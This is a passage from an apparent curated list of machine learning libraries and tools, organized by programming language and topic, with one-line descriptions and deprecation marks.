learning for data streams with an interface to plug-in different stream processing platforms.\nRankLib - RankLib is a library of learning to rank algorithms. [Deprecated]\nrapaio - statistics, data mining and machine learning toolbox in Java.\nRapidMiner - RapidMiner integration into Java code.\nStanford Classifier - A classifier is a machine learning tool that will take data items and place them into one of k classes.\nSmileMiner - Statistical Machine Intelligence & Learning Engine.\nSystemML - flexible, scalable machine learning (ML) language.\nWeka - Weka is a collection of machine learning algorithms for data mining tasks.\nLBJava - Learning Based Java is a modeling language for the rapid development of software systems, offers a convenient, declarative syntax for classifier and constraint definition directly in terms of the objects in the programmer's application.\n\n\nSpeech Recognition\n\nCMU Sphinx - Open Source Toolkit For Speech Recognition purely based on Java speech recognition library.\n\n\nData Analysis / Data Visualization\n\nFlink - Open source platform for distributed stream and batch data processing.\nHadoop - Hadoop/HDFS.\nOnyx - Distributed, masterless, high performance, fault tolerant data processing. Written entirely in Clojure.\nSpark - Spark is a fast and general engine for large-scale data processing.\nStorm - Storm is a distributed realtime computation system.\nImpala - Real-time Query for Hadoop.\nDataMelt - Mathematics software for numeric computation, statistics, symbolic calculations, data analysis and data visualization.\nDr. Michael Thomas Flanagan's Java Scientific Library [Deprecated]\n\n\nDeep Learning\n\nDeeplearning4j - Scalable deep learning for industry with parallel GPUs.\n\n\nJavascript\n\nNatural Language Processing\n\nTwitter-text - A JavaScript implementation of Twitter's text processing library.\nnatural - General natural language facilities for node.\nKnwl.js - A Natural Language Processor in JS.\nRetext - Extensible system for analyzing and manipulating natural language.\nNLP Compromise - Natural Language processing in the browser.\nnlp.js - An NLP library built in node over Natural, with entity extraction, sentiment analysis, automatic language identify, and so more\n\n\nData Analysis / Data Visualization\n\nD3.js\nHigh Charts\nNVD3.js\ndc.js\nchartjs\ndimple\namCharts\nD3xter - Straight forward plotting built on D3. [Deprecated]\nstatkit - Statistics kit for JavaScript. [Deprecated]\ndatakit - A lightweight framework for data analysis in JavaScript\nscience.js - Scientific and statistical computing in JavaScript. [Deprecated]\nZ3d - Easily make interactive 3d plots built on Three.js [Deprecated]\nSigma.js - JavaScript library dedicated to graph drawing.\nC3.js - customizable library based on D3.js for easy chart drawing.\nDatamaps - Customizable SVG map/geo visualizations using D3.js. [Deprecated]\nZingChart - library written on Vanilla JS for big data visualization.\ncheminfo - Platform for data visualization and analysis, using the visualizer project.\nLearn JS Data\nAnyChart\nFusionCharts\nNivo - built on top of the awesome d3 and Reactjs libraries\n\n\nGeneral-Purpose Machine Learning\n\nAuto ML - Automated machine learning, data formatting, ensembling, and hyperparameter optimization for competitions and exploration- just give it a .csv file!\nConvnet.js - ConvNetJS is a Javascript library for training Deep Learning models[DEEP LEARNING] [Deprecated]\nClusterfck - Agglomerative hierarchical clustering implemented in Javascript for Node.js and the browser. [Deprecated]\nClustering.js - Clustering algorithms implemented in Javascript for Node.js and the browser. [Deprecated]\nDecision Trees - NodeJS Implementation of Decision Tree using ID3 Algorithm. [Deprecated]\nDN2A - Digital Neural Networks Architecture. [Deprecated]\nfigue - K-means, fuzzy c-means and agglomerative clustering.\nGaussian Mixture Model - Unsupervised machine learning with multivariate Gaussian mixture model.\nNode-fann - FANN (Fast Artificial Neural Network Library) bindings for Node.js [Deprecated]\nKeras.js - Run Keras models in the browser, with GPU support provided by WebGL 2.\nKmeans.js - Simple Javascript implementation of the k-means algorithm, for node.js and the browser. [Deprecated]\nLDA.js - LDA topic modeling for Node.js\nLearning.js - Javascript implementation of logistic regression/c4.5 decision tree [Deprecated]\nmachinelearn.js - Machine Learning library for the web, Node.js and developers\nmil-tokyo - List of several machine learning libraries.\nNode-SVM - Support Vector Machine for Node.js\nBrain - Neural networks in JavaScript [Deprecated]\nBrain.js - Neural networks in JavaScript - continued community fork of Brain.\nBayesian-Bandit - Bayesian bandit implementation for Node and the browser. [Deprecated]\nSynaptic - Architecture-free neural network library for Node.js and the browser.\nkNear - JavaScript implementation of the k nearest neighbors algorithm for supervised learning.\nNeuralN - C++ Neural Network library for Node.js. It has advantage on large dataset and multi-threaded training. [Deprecated]\nkalman - Kalman filter for Javascript. [Deprecated]\nshaman - Node.js library with support for both simple and multiple linear regression. [Deprecated]\nml.js - Machine learning and numerical analysis tools for Node.js and the Browser!\nml5 - Friendly machine learning for the web!\nPavlov.js - Reinforcement learning using Markov Decision Processes.\nMXNet - Lightweight, Portable, Flexible Distributed/Mobile Deep Learning with Dynamic, Mutation-aware Dataflow Dep Scheduler; for Python, R, Julia, Go, Javascript and more.\nTensorFlow.js - A WebGL accelerated, browser based JavaScript library for training and deploying ML models.\nJSMLT - Machine learning toolkit with classification and clustering for Node.js; supports visualization (see visualml.io).\nxgboost-node - Run XGBoost model and make predictions in Node.js.\nNetron - Visualizer for machine learning models.\nWebDNN - Fast Deep Neural Network Javascript Framework. WebDNN uses next generation JavaScript API, WebGPU for GPU execution, and WebAssembly for CPU execution.\n\n\nMisc\n\nstdlib - A standard library for JavaScript and Node.js, with an emphasis on numeric computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.\nsylvester - Vector and Matrix math for JavaScript. [Deprecated]\nsimple-statistics - A JavaScript implementation of descriptive, regression, and inference statistics. Implemented in literate JavaScript with no dependencies, designed to work in all modern browsers (including IE) as well as in Node.js.\nregression-js - A javascript library containing a collection of least squares fitting methods for finding a trend in a set of data.\nLyric - Linear Regression library. [Deprecated]\nGreatCircle - Library for calculating great circle distance.\nMLPleaseHelp - MLPleaseHelp is a simple ML resource search engine. You can use this search engine right now at https://jgreenemi.github.io/MLPleaseHelp/, provided via Github Pages.\n\n\nDemos and Scripts\n\nThe Bot - Example of how the neural network learns to predict the angle between two points created with Synaptic.\nHalf Beer - Beer glass classifier created with Synaptic.\n\n\nJulia\n\nGeneral-Purpose Machine Learning\n\nMachineLearning - Julia Machine Learning library. [Deprecated]\nMLBase - A set of functions to support the development of machine learning algorithms.\nPGM - A Julia framework for probabilistic graphical models.\nDA - Julia package for Regularized Discriminant Analysis.\nRegression - Algorithms for regression analysis (e.g. linear regression and logistic regression). [Deprecated]\nLocal Regression - Local regression, so smooooth!\nNaive Bayes - Simple Naive Bayes implementation in Julia. [Deprecated]\nMixed Models - A Julia package for fitting (statistical) mixed-effects models.\nSimple MCMC - basic mcmc sampler implemented in Julia. [Deprecated]\nDistances - Julia module for Distance evaluation.\nDecision Tree - Decision Tree Classifier and Regressor.\nNeural - A neural network in Julia.\nMCMC - MCMC tools for Julia. [Deprecated]\nMamba - Markov chain Monte Carlo (MCMC) for Bayesian analysis in Julia.\nGLM - Generalized linear models in Julia.\nGaussian Processes - Julia package for Gaussian processes.\nOnline Learning [Deprecated]\nGLMNet - Julia wrapper for fitting Lasso/ElasticNet GLM models using glmnet.\nClustering - Basic functions for clustering data: k-means, dp-means, etc.\nSVM - SVM's for Julia. [Deprecated]\nKernel Density - Kernel density estimators for julia.\nMultivariateStats - Methods for dimensionality reduction.\nNMF - A Julia package for non-negative matrix factorization.\nANN - Julia artificial neural networks. [Deprecated]\nMocha - Deep Learning framework for Julia inspired by Caffe. [Deprecated]\nXGBoost - eXtreme Gradient Boosting Package in Julia.\nManifoldLearning - A Julia package for manifold learning and nonlinear dimensionality reduction.\nMXNet - Lightweight, Portable, Flexible Distributed/Mobile Deep Learning with Dynamic, Mutation-aware Dataflow Dep Scheduler; for Python, R, Julia, Go, Javascript and more.\nMerlin - Flexible Deep Learning Framework in Julia.\nROCAnalysis - Receiver Operating Characteristics and functions for evaluation probabilistic binary classifiers.\nGaussianMixtures - Large scale Gaussian Mixture Models.\nScikitLearn - Julia implementation of the scikit-learn API.\nKnet - Ko\u00e7 University Deep Learning Framework.\n\n\nNatural Language Processing\n\nTopic Models - TopicModels for Julia. [Deprecated]\nText Analysis - Julia package for text analysis.\n\n\nData Analysis / Data Visualization\n\nGraph Layout - Graph layout algorithms in pure Julia.\nLightGraphs - Graph modeling and analysis.\nData Frames Meta - Metaprogramming tools for DataFrames.\nJulia Data - library for working with tabular data in Julia. [Deprecated]\nData Read - Read files from Stata, SAS, and SPSS.\nHypothesis Tests - Hypothesis tests for Julia.\nGadfly - Crafty statistical graphics for Julia.\nStats - Statistical tests for Julia.\nRDataSets - Julia package for loading many of the data sets available in R.\nDataFrames - library for working with tabular data in Julia.\nDistributions - A Julia package for probability distributions and associated functions.\nData Arrays - Data structures that allow missing values. [Deprecated]\nTime Series - Time series toolkit for Julia.\nSampling - Basic sampling algorithms for Julia.\n\n\nMisc Stuff / Presentations\n\nDSP - Digital Signal Processing (filtering, periodograms, spectrograms, window functions).\nJuliaCon Presentations - Presentations for JuliaCon.\nSignalProcessing - Signal Processing tools for Julia.\nImages - An image library for Julia.\n\n\nLua\n\nGeneral-Purpose Machine Learning\n\nTorch7\n\ncephes - Cephes mathematical functions library, wrapped for Torch. Provides and wraps the 180+ special mathematical functions from the Cephes mathematical library, developed by Stephen L. Moshier. It is used, among many other places, at the heart of SciPy. [Deprecated]\nautograd - Autograd automatically differentiates native Torch code. Inspired by the original Python version.\ngraph - Graph package for Torch. [Deprecated]\nrandomkit - Numpy's randomkit, wrapped for Torch. [Deprecated]\nsignal - A signal processing toolbox for Torch-7. FFT, DCT, Hilbert, cepstrums, stft.\nnn - Neural Network package for Torch.\ntorchnet - framework for torch which provides a set of abstractions aiming at encouraging code re-use as well as encouraging modular programming.\nnngraph - This package provides graphical computation for nn library in Torch7.\nnnx - A completely unstable and experimental package that extends Torch's builtin nn library.\nrnn - A Recurrent Neural Network library that extends Torch's nn. RNNs, LSTMs, GRUs, BRNNs, BLSTMs, etc.\ndpnn - Many useful features that aren't part of the main nn package.\ndp - A deep learning library designed for streamlining research and development using the Torch7 distribution. It emphasizes flexibility through the elegant use of object-oriented design patterns. [Deprecated]\noptim - An optimization library for Torch. SGD, Adagrad, Conjugate-Gradient, LBFGS, RProp and more.\nunsup - A package for unsupervised learning in Torch. Provides modules that are compatible with nn (LinearPsd, ConvPsd, AutoEncoder, ...), and self-contained algorithms (k-means, PCA). [Deprecated]\nmanifold - A package to manipulate manifolds.\nsvm - Torch-SVM library. [Deprecated]\nlbfgs - FFI Wrapper for liblbfgs. [Deprecated]\nvowpalwabbit - An old vowpalwabbit interface to torch. [Deprecated]\nOpenGM - OpenGM is a C++ library for graphical modeling, and inference. The Lua bindings provide a simple way of describing graphs, from Lua, and then optimizing them with OpenGM. [Deprecated]\nspaghetti - Spaghetti (sparse linear) module for torch7 by @MichaelMathieu [Deprecated]\nLuaSHKit - A lua wrapper around the Locality sensitive hashing library SHKit [Deprecated]\nkernel smoothing - KNN, kernel-weighted average, local linear regression smoothers. [Deprecated]\ncutorch - Torch CUDA Implementation.\ncunn - Torch CUDA Neural Network Implementation.\nimgraph - An image/graph library for Torch. This package provides routines to construct graphs on images, segment them, build trees out of them, and convert them back to images. [Deprecated]\nvideograph - A video/graph library for Torch. This package provides routines to construct graphs on videos, segment them, build trees out of them, and convert them back to videos. [Deprecated]\nsaliency - code and tools around integral images. A library for finding interest points based on fast integral histograms. [Deprecated]\nstitch - allows us to use hugin to stitch images and apply same stitching to a video sequence. [Deprecated]\nsfm - A bundle adjustment/structure from motion package. [Deprecated]\nfex - A package for feature extraction in Torch. Provides SIFT and dSIFT modules. [Deprecated]\nOverFeat - A state-of-the-art generic dense feature extractor. [Deprecated]\nwav2letter - a simple and efficient end-to-end Automatic Speech Recognition (ASR) system from Facebook AI Research.\n\n\nNumeric Lua\nLunatic Python\nSciLua\nLua - Numerical Algorithms [Deprecated]\nLunum [Deprecated]\n\n\nDemos and Scripts\n\nCore torch7 demos repository.\n\nlinear-regression, logistic-regression\nface detector (training and detection as separate demos)\nmst-based-segmenter\ntrain-a-digit-classifier\ntrain-autoencoder\noptical flow demo\ntrain-on-housenumbers\ntrain-on-cifar\ntracking with deep nets\nkinect demo\nfilter-bank visualization\nsaliency-networks\n\n\nTraining a Convnet for the Galaxy-Zoo Kaggle challenge(CUDA demo)\nMusic Tagging - Music Tagging scripts for torch7.\ntorch-datasets - Scripts to load several popular datasets including:\n\nBSR 500\nCIFAR-10\nCOIL\nStreet View House Numbers\nMNIST\nNORB\n\n\nAtari2600 - Scripts to generate a dataset with static frames from the Arcade Learning Environment.\n\n\nMatlab\n\nComputer Vision\n\nContourlets - MATLAB source code that implements the contourlet transform and its utility functions.\nShearlets - MATLAB code for shearlet transform.\nCurvelets - The Curvelet transform is a higher dimensional generalization of the Wavelet transform designed to represent images at different scales and different angles.\nBandlets - MATLAB code for bandlet transform.\nmexopencv - Collection and a development kit of MATLAB mex functions for OpenCV library.\n\n\nNatural Language Processing\n\nNLP - An NLP library for Matlab.\n\n\nGeneral-Purpose Machine Learning\n\nTraining a deep autoencoder or a classifier\non MNIST digits - Training a deep autoencoder or a classifier\non MNIST digits[DEEP LEARNING].\nConvolutional-Recursive Deep Learning for 3D Object Classification - Convolutional-Recursive Deep Learning for 3D Object Classification[DEEP LEARNING].\nSpider - The spider is intended to be a complete object orientated environment for machine learning in Matlab.\nLibSVM - A Library for Support Vector Machines.\nThunderSVM - An Open-Source SVM Library on GPUs and CPUs\nLibLinear - A Library for Large Linear Classification.\nMachine Learning Module - Class on machine w/ PDF, lectures, code\nCaffe - A deep learning framework developed with cleanliness, readability, and speed in mind.\nPattern Recognition Toolbox - A complete object-oriented environment for machine learning in Matlab.\nPattern Recognition and Machine Learning - This package contains the matlab implementation of the algorithms described in the book Pattern Recognition and Machine Learning by C. Bishop.\nOptunity - A library dedicated to automated hyperparameter optimization with a simple, lightweight API to facilitate drop-in replacement of grid search. Optunity is written in Python but interfaces seamlessly with MATLAB.\nMXNet - Lightweight, Portable, Flexible Distributed/Mobile Deep Learning with Dynamic, Mutation-aware Dataflow Dep Scheduler; for Python, R, Julia, Go, Javascript and more.\nMachine Learning in MatLab/Octave - examples of popular machine learning algorithms (neural networks, linear/logistic regressions, K-Means, etc.) with code examples and mathematics behind them being explained.\n\n\nData Analysis / Data Visualization\n\nmatlab_bgl - MatlabBGL is a Matlab package for working with graphs.\ngaimc - Efficient pure-Matlab implementations of graph algorithms to complement MatlabBGL's mex functions.\n\n\n.NET\n\nComputer Vision\n\nOpenCVDotNet - A wrapper for the OpenCV project to be used with .NET applications.\nEmgu CV - Cross platform wrapper of OpenCV which can be compiled in Mono to be run on Windows, Linus, Mac OS X, iOS, and Android.\nAForge.NET - Open source C# framework for developers and researchers in the fields of Computer Vision and Artificial Intelligence. Development has now shifted to GitHub.\nAccord.NET - Together with AForge.NET, this library can provide image processing and computer vision algorithms to Windows, Windows RT and Windows Phone. Some components are also available for Java and Android.\n\n\nNatural Language Processing\n\nStanford.NLP for .NET - A full port of Stanford NLP packages to .NET and also available precompiled as a NuGet package.\n\n\nGeneral-Purpose Machine Learning\n\nAccord-Framework -The Accord.NET Framework is a complete framework for building machine learning, computer vision, computer audition, signal processing and statistical applications.\nAccord.MachineLearning - Support Vector Machines, Decision Trees, Naive Bayesian models, K-means, Gaussian Mixture models and general algorithms such as Ransac, Cross-validation and Grid-Search for machine-learning applications. This package is part of the Accord.NET Framework.\nDiffSharp - An automatic differentiation (AD) library providing exact and efficient derivatives (gradients, Hessians, Jacobians, directional derivatives, and matrix-free Hessian- and Jacobian-vector products) for machine learning and optimization applications. Operations can be nested to any level, meaning that you can compute exact higher-order derivatives and differentiate functions that are internally making use of differentiation, for applications such as hyperparameter optimization.\nEncog - An advanced neural network and machine learning framework. Encog contains classes to create a wide variety of networks, as well as support classes to normalize and process data for these neural networks. Encog trains using multithreaded resilient propagation. Encog can also make use of a GPU to further speed processing time. A GUI based workbench is also provided to help model and train neural networks.\nGeneticSharp - Multi-platform genetic algorithm library for .NET Core and .NET Framework. The library has several implementations of GA operators, like: selection, crossover, mutation, reinsertion and termination.\nInfer.NET - Infer.NET is a framework for running Bayesian inference in graphical models. One can use Infer.NET to solve many different kinds of machine learning problems, from standard problems like classification, recommendation or clustering through to customised solutions to domain-specific problems. Infer.NET has been used in a wide variety of domains including information retrieval, bioinformatics, epidemiology, vision, and many others.\nML.NET - ML.NET is a cross-platform open-source machine learning framework which makes machine learning accessible to .NET developers. ML.NET was originally developed in Microsoft Research and evolved into a significant framework over the last decade and is used across many product groups in Microsoft like Windows, Bing, PowerPoint, Excel and more.\nNeural Network Designer - DBMS management system and designer for neural networks. The designer application is developed using WPF, and is a user interface which allows you to design your neural network, query the network, create and configure chat bots that are capable of asking questions and learning from your feed back. The chat bots can even scrape the internet for information to return in their output as well as to use for learning.\nVulpes - Deep belief and deep learning implementation written in F# and leverages CUDA GPU execution with Alea.cuBase.\n\n\nData Analysis / Data Visualization\n\nnuml - numl is a machine learning library intended to ease the use of using standard modeling techniques for both prediction and clustering.\nMath.NET Numerics - Numerical foundation of the Math.NET project, aiming to provide methods and algorithms for numerical computations in science, engineering and every day use. Supports .Net 4.0, .Net 3.5 and Mono on Windows, Linux and Mac; Silverlight 5, WindowsPhone/SL 8, WindowsPhone 8.1 and Windows 8 with PCL Portable Profiles 47 and 344; Android/iOS with Xamarin.\nSho - Sho is an interactive environment for data analysis and scientific computing that lets you seamlessly connect scripts (in IronPython) with compiled code (in .NET) to enable fast and flexible prototyping. The environment includes powerful and efficient libraries for linear algebra as well as data visualization that can be used from any .NET language, as well as a feature-rich interactive shell for rapid development.\n\n\nObjective C\n\nGeneral-Purpose Machine Learning\n\nYCML - A Machine Learning framework for Objective-C and Swift (OS X / iOS).\nMLPNeuralNet - Fast multilayer perceptron neural network library for iOS and Mac OS X. MLPNeuralNet predicts new examples by trained neural network. It is built on top of the Apple's Accelerate Framework, using vectorized operations and hardware acceleration if available. [Deprecated]\nMAChineLearning - An Objective-C multilayer perceptron library, with full support for training through backpropagation. Implemented using vDSP and vecLib, it's 20 times faster than its Java equivalent. Includes sample code for use from Swift.\nBPN-NeuralNetwork - It implemented 3 layers neural network ( Input Layer, Hidden Layer and Output Layer ) and it named Back Propagation Neural Network (BPN). This network can be used in products recommendation, user behavior analysis, data mining and data analysis. [Deprecated]\nMulti-Perceptron-NeuralNetwork - it implemented multi-perceptrons neural network (\u30cb\u30e5\u30fc\u30e9\u30eb\u30cd\u30c3\u30c8\u30ef\u30fc\u30af) based on Back Propagation Neural Network (BPN) and designed unlimited-hidden-layers.\nKRHebbian-Algorithm - It is a non-supervisor and self-learning algorithm (adjust the weights) in neural network of Machine Learning. [Deprecated]\nKRKmeans-Algorithm - It implemented K-Means the clustering and classification algorithm. It could be used in data mining and image compression. [Deprecated]\nKRFuzzyCMeans-Algorithm - It implemented Fuzzy C-Means (FCM) the fuzzy clustering / classification algorithm on Machine Learning. It could be used in data mining and image compression. [Deprecated]\n\n\nOCaml\n\nGeneral-Purpose Machine Learning\n\nOml - A general statistics and machine learning library.\nGPR - Efficient Gaussian Process Regression in OCaml.\nLibra-Tk - Algorithms for learning and inference with discrete probabilistic models.\nTensorFlow - OCaml bindings for TensorFlow.\n\n\nPerl\n\nData Analysis / Data Visualization\n\nPerl Data Language, a pluggable architecture for data and image processing, which can\nbe used for machine learning.\n\n\nGeneral-Purpose Machine Learning\n\nMXnet for Deep Learning, in Perl,\nalso released in CPAN.\nPerl Data Language,\nusing AWS machine learning platform from Perl.\nAlgorithm::SVMLight,\nimplementation of Support Vector Machines with SVMLight under it. [Deprecated]\nSeveral machine learning and artificial intelligence models are\nincluded in the AI\nnamespace. For instance, you can\nfind Na\u00efve Bayes.\n\n\nPerl 6\n\nSupport Vector Machines\nNa\u00efve Bayes\n\nData Analysis / Data Visualization\n\nPerl Data Language,\na pluggable architecture for data and image processing, which can\nbe\nused for machine learning.\n\nGeneral-Purpose Machine Learning\n\nPHP\n\nNatural Language Processing\n\njieba-php - Chinese Words Segmentation Utilities.\n\n\nGeneral-Purpose Machine Learning\n\nPHP-ML - Machine Learning library for PHP. Algorithms, Cross Validation, Neural Network, Preprocessing, Feature Extraction and much more in one library.\nPredictionBuilder - A library for machine learning that builds predictions using a linear regression.\nRubix ML - A high-level machine learning (ML) library that lets you build programs that learn from data using the PHP language.\n19 Questions - A machine learning / bayesian inference assigning attributes to objects.\n\n\nPython\n\nComputer Vision\n\nScikit-Image - A collection of algorithms for image processing in Python.\nSimpleCV - An open source computer vision framework that gives access to several high-powered computer vision libraries, such as OpenCV. Written on Python and runs on Mac, Windows, and Ubuntu Linux.\nVigranumpy - Python bindings for the VIGRA C++ computer vision library.\nOpenFace - Free and open source face recognition with deep neural networks.\nPCV - Open source Python module for computer vision. [Deprecated]\nface_recognition - Face recognition library that recognize and manipulate faces from Python or from the command line.\ndockerface - Easy to install and use deep learning Faster R-CNN face detection for images and video in a docker container.\nDetectron - FAIR's software system that implements state-of-the-art object detection algorithms, including Mask R-CNN. It is written in Python and powered by the Caffe2 deep learning framework.\nalbumentations - \u0410 fast and framework agnostic image augmentation library that implements a diverse set of augmentation techniques. Supports classification, segmentation, detection out of the box. Was used to win a number of Deep Learning competitions at Kaggle, Topcoder and those that were a part of the CVPR workshops.\npytessarct - Python-tesseract is an optical character recognition (OCR) tool for python. That is, it will recognize and \"read\" the text embedded in images.Python-tesseract is a wrapper for Google's Tesseract-OCR Engine>.\nimutils - A library containg Convenience functions to make basic image processing operations such as translation, rotation, resizing, skeletonization, and displaying Matplotlib images easier with OpenCV and Python.\nPyTorchCV - A PyTorch-Based Framework for Deep Learning in Computer Vision.\n\n\nNatural Language Processing\n\npkuseg-python - A better version of Jieba, developed by Peking University.\nNLTK - A leading platform for building Python programs to work with human language data.\nPattern - A web mining module for the Python programming language. It has tools for natural language processing, machine learning, among others.\nQuepy - A python framework to transform natural language questions to queries in a database query language.\nTextBlob - Providing a consistent API for diving into common natural language processing (NLP) tasks. Stands on the giant shoulders of NLTK and Pattern, and plays nicely with both.\nYAlign - A sentence aligner, a friendly tool for extracting parallel sentences from comparable corpora. [Deprecated]\njieba - Chinese Words Segmentation Utilities.\nSnowNLP - A library for processing Chinese text.\nspammy - A library for email Spam filtering built on top of nltk\nloso - Another Chinese segmentation library. [Deprecated]\ngenius - A Chinese segment base on Conditional Random Field.\nKoNLPy - A Python package for Korean natural language processing.\nnut - Natural language Understanding Toolkit. [Deprecated]\nRosetta - Text processing tools and wrappers (e.g. Vowpal Wabbit)\nBLLIP Parser - Python bindings for the BLLIP Natural Language Parser (also known as the Charniak-Johnson parser). [Deprecated]\nPyNLPl - Python Natural Language Processing Library. General purpose NLP library for Python. Also contains some specific modules for parsing common NLP formats, most notably for FoLiA, but also ARPA language models, Moses phrasetables, GIZA++ alignments.\npython-ucto - Python binding to ucto (a unicode-aware rule-based tokenizer for various languages).\npython-frog - Python binding to Frog, an NLP suite for Dutch. (pos tagging, lemmatisation, dependency parsing, NER)\npython-zpar - Python bindings for ZPar, a statistical part-of-speech-tagger, constiuency parser, and dependency parser for English.\ncolibri-core - Python binding to C++ library for extracting and working with with basic linguistic constructions such as n-grams and skipgrams in a quick and memory-efficient way.\nspaCy - Industrial strength NLP with Python and Cython.\nPyStanfordDependencies - Python interface for converting Penn Treebank trees to Stanford Dependencies.\nDistance - Levenshtein and Hamming distance computation. [Deprecated]\nFuzzy Wuzzy - Fuzzy String Matching in Python.\njellyfish - a python library for doing approximate and phonetic matching of strings.\neditdistance - fast implementation of edit distance.\ntextacy - higher-level NLP built on Spacy.\nstanford-corenlp-python - Python wrapper for Stanford CoreNLP [Deprecated]\nCLTK - The Classical Language Toolkit.\nrasa_nlu - turn natural language into structured data.\nyase - Transcode sentence (or other sequence) to list of word vector .\nPolyglot - Multilingual text (NLP) processing toolkit.\nDrQA - Reading Wikipedia to answer open-domain questions.\nDedupe - A python library for accurate and scalable fuzzy matching, record deduplication and entity-resolution.\nSnips NLU - Natural Language Understanding library for intent classification and entity extraction\nNeuroNER - Named-entity recognition using neural networks providing state-of-the-art-results\n\n\nGeneral-Purpose Machine Learning\n\nPyOD -> Python Outlier Detection, comprehensive and scalable Python toolkit for detecting outlying objects in multivariate data. Featured for Advanced models, including Neural Networks/Deep Learning and Outlier Ensembles.\nsteppy -> Lightweight, Python library for fast and reproducible machine learning experimentation. Introduces very simple interface that enables clean machine learning pipeline design.\nsteppy-toolkit -> Curated collection of the neural networks, transformers and models that make your machine learning work faster and more effective.\nCNTK - Microsoft Cognitive Toolkit (CNTK), an open source deep-learning toolkit. Documentation can be found here.\nauto_ml - Automated machine learning for production and analytics. Lets you focus on the fun parts of ML, while outputting production-ready code, and detailed analytics of your dataset and results. Includes support for NLP, XGBoost, CatBoost, LightGBM, and soon, deep learning.\nmachine learning - automated build consisting of a web-interface, and set of programmatic-interface API, for support vector machines. Corresponding dataset(s) are stored into a SQL database, then generated model(s) used for prediction(s), are stored into a NoSQL datastore.\nXGBoost - Python bindings for eXtreme Gradient Boosting (Tree) Library.\nApache SINGA - An Apache Incubating project for developing an open source machine learning library.\nBayesian Methods for Hackers - Book/iPython notebooks on Probabilistic Programming in Python.\nFeatureforge A set of tools for creating and testing machine learning features, with a scikit-learn compatible API.\nMLlib in Apache Spark - Distributed machine learning library in Spark\nHydrosphere Mist - a service for deployment Apache Spark MLLib machine learning models as realtime, batch or reactive web services.\nscikit-learn - A Python module for machine learning built on top of SciPy.\nmetric-learn - A Python module for metric learning.\nSimpleAI Python implementation of many of the artificial intelligence algorithms described on the book \"Artificial Intelligence, a Modern Approach\". It focuses on providing an easy to use, well documented and tested library.\nastroML - Machine Learning and Data Mining for Astronomy.\ngraphlab-create - A library with various machine learning models (regression, clustering, recommender systems, graph analytics, etc.) implemented on top of a disk-backed DataFrame.\nBigML - A library that contacts external servers.\npattern - Web mining module for Python.\nNuPIC - Numenta Platform for Intelligent Computing.\nPylearn2 - A Machine Learning library based on Theano.\nkeras - High-level neural networks frontend for TensorFlow, CNTK and Theano.\nLasagne - Lightweight library to build and train neural networks in Theano.\nhebel - GPU-Accelerated Deep Learning Library in Python. [Deprecated]\nChainer - Flexible neural network framework.\nprophet - Fast and automated time series forecasting framework by Facebook.\ngensim - Topic Modelling for Humans.\ntopik - Topic modelling toolkit. [Deprecated]\nPyBrain - Another Python Machine Learning Library.\nBrainstorm - Fast, flexible and fun neural networks. This is the successor of PyBrain.\nSurprise - A scikit for building and analyzing recommender systems.\nCrab - A flexible, fast recommender engine. [Deprecated]\npython-recsys - A Python library for implementing a Recommender System.\nthinking bayes - Book on Bayesian Analysis.\nImage-to-Image Translation with Conditional Adversarial Networks - Implementation of image to image (pix2pix) translation from the paper by isola et al.[DEEP LEARNING]\nRestricted Boltzmann Machines -Restricted Boltzmann Machines in Python. [DEEP LEARNING]\nBolt - Bolt Online Learning Toolbox. [Deprecated]\nCoverTree - Python implementation of cover trees, near-drop-in replacement for scipy.spatial.kdtree [Deprecated]\nnilearn - Machine learning for NeuroImaging in Python.\nneuropredict - Aimed at novice machine learners and non-expert programmers, this package offers easy (no coding needed) and comprehensive machine learning (evaluation and full report of predictive performance WITHOUT requiring you to code) in Python for NeuroImaging and any other type of features. This is aimed at absorbing the much of the ML workflow, unlike other packages like nilearn and pymvpa, which require you to learn their API and code to produce anything useful.\nimbalanced-learn - Python module to perform under sampling and over sampling with various techniques.\nShogun - The Shogun Machine Learning Toolbox.\nPyevolve - Genetic algorithm framework. [Deprecated]\nCaffe - A deep learning framework developed with cleanliness, readability, and speed in mind.\nbreze - Theano based library for deep and recurrent neural networks. [Deprecated]\npyhsmm - library for approximate unsupervised inference in Bayesian Hidden Markov Models (HMMs) and explicit-duration Hidden semi-Markov Models (HSMMs), focusing on the Bayesian Nonparametric extensions, the HDP-HMM and HDP-HSMM, mostly with weak-limit approximations.\nmrjob - A library to let Python program run on Hadoop.\nSKLL - A wrapper around scikit-learn that makes it simpler to conduct experiments.\nneurolab\nSpearmint - Spearmint is a package to perform Bayesian optimization according to the algorithms outlined in the paper: Practical Bayesian Optimization of Machine Learning Algorithms. Jasper Snoek, Hugo Larochelle and Ryan P. Adams. Advances in Neural Information Processing Systems, 2012. [Deprecated]\nPebl - Python Environment for Bayesian Learning. [Deprecated]\nTheano - Optimizing GPU-meta-programming code generating array oriented optimizing math compiler in Python.\nTensorFlow - Open source software library for numerical computation using data flow graphs.\npomegranate - Hidden Markov Models for Python, implemented in Cython for speed and efficiency.\npython-timbl - A Python extension module wrapping the full TiMBL C++ programming interface. Timbl is an elaborate k-Nearest Neighbours machine learning toolkit.\ndeap - Evolutionary algorithm framework.\npydeep - Deep Learning In Python. [Deprecated]\nmlxtend - A library consisting of useful tools for data science and machine learning tasks.\nneon - Nervana's high-performance Python-based Deep Learning framework [DEEP LEARNING].\nOptunity - A library dedicated to automated hyperparameter optimization with a simple, lightweight API to facilitate drop-in replacement of grid search.\nNeural Networks and Deep Learning - Code samples for my book \"Neural Networks and Deep Learning\" [DEEP LEARNING].\nAnnoy - Approximate nearest neighbours implementation.\nTPOT - Tool that automatically creates and optimizes machine learning pipelines using genetic programming. Consider it your personal data science assistant, automating a tedious part of machine learning.\npgmpy A python library for working with Probabilistic Graphical Models.\nDIGITS - The Deep Learning GPU Training System (DIGITS) is a web application for training deep learning models.\nOrange - Open source data visualization and data analysis for novices and experts.\nMXNet - Lightweight, Portable, Flexible Distributed/Mobile Deep Learning with Dynamic, Mutation-aware Dataflow Dep Scheduler; for Python, R, Julia, Go, Javascript and more.\nmilk - Machine learning toolkit focused on supervised classification. [Deprecated]\nTFLearn - Deep learning library featuring a higher-level API for TensorFlow.\nREP - an IPython-based environment for conducting data-driven research in a consistent and reproducible way. REP is not trying to substitute scikit-learn, but extends it and provides better user experience. [Deprecated]\nrgf_python - Python bindings for Regularized Greedy Forest (Tree) Library.\nskbayes - Python package for Bayesian Machine Learning with scikit-learn API.\nfuku-ml - Simple machine learning library, including Perceptron, Regression, Support Vector Machine, Decision Tree and more, it's easy to use and easy to learn for beginners.\nXcessiv - A web-based application for quick, scalable, 